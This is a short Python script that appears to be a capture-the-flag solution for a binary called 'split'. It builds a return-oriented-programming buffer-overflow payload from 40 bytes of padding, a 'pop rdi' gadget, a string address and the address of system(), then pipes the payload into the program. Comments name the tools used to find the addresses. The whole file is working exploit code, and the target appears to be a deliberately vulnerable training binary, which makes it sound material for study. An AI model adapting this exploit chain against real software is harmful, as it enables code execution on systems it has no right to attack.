#!/usr/bin/python
import struct
import os

offset = 40
#objdump -D split|grep system
system = struct.pack("<Q", 0x4005e0)
#rabin2 -z split
cat = struct.pack("<Q",0x601060)

garb = "A"* offset

#gdb> ropsearch "pop rdi"
pop_rdi = struct.pack("<Q",0x00400883)

exploit = garb + pop_rdi + cat + system

with open("simple_exploit.txt","w") as f:
	f.write(exploit)
	f.close()

os.system("cat simple_exploit.txt|./split")
